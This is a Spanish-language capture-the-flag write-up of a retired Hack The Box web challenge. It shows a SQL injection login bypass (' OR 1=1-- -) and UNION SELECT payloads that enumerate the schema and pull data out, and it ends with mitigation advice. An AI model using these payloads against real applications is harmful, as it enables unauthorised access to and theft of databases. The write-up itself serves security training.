---
challenge: Freelancer
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, sqli, login-bypass, union, database]
---

# Freelancer — Hack The Box

[⚑ English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Plataforma de freelancers con login y buscador. El formulario de acceso monta la consulta por concatenación: **inyección SQL**. Bypass del login con `' OR 1=1-- -` y extracción de la flag con `UNION SELECT` sobre la tabla que la guarda.

## Enunciado

Login con usuario y contraseña y un buscador de proyectos tras autenticarse. Base de datos MySQL/MariaDB.

## Análisis

Probar el bypass clásico en el usuario:

```text
usuario:  ' OR 1=1-- -
password: cualquiera
```

Si entra, la consulta es del tipo:

```sql
SELECT * FROM users WHERE username = '$u' AND password = '$p'
```

Determinar el número de columnas:

```text
' ORDER BY 1-- -
' ORDER BY 2-- -
...
```

## Explotación

Con el login saltado, el buscador es el punto de extracción:

```text
' UNION SELECT 1,2,3-- -
```

Se colocan las columnas visibles y se enumeran esquema y tablas:

```text
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='<tabla>'-- -
' UNION SELECT 1,<columna>,3 FROM <tabla>-- -
```

```text
HTB{<flag>}
```

## Tropiezos

- **Comentario**: MySQL necesita `-- -` con espacio o `#`; sin él la consulta queda inválida.
- **Comillas escapadas**: probar variantes con `"` o con `\'`.
- **Columnas**: si `UNION` falla, ajustar el número con `ORDER BY` antes.

## Lecciones

- Un login vulnerable a SQLi entrega la base de datos entera, no solo el acceso.
- `UNION` convierte cualquier campo reflejado en un canal de extracción.
- Mitigación: consultas preparadas, usuario de BD con permisos mínimos y un WAF como capa extra.
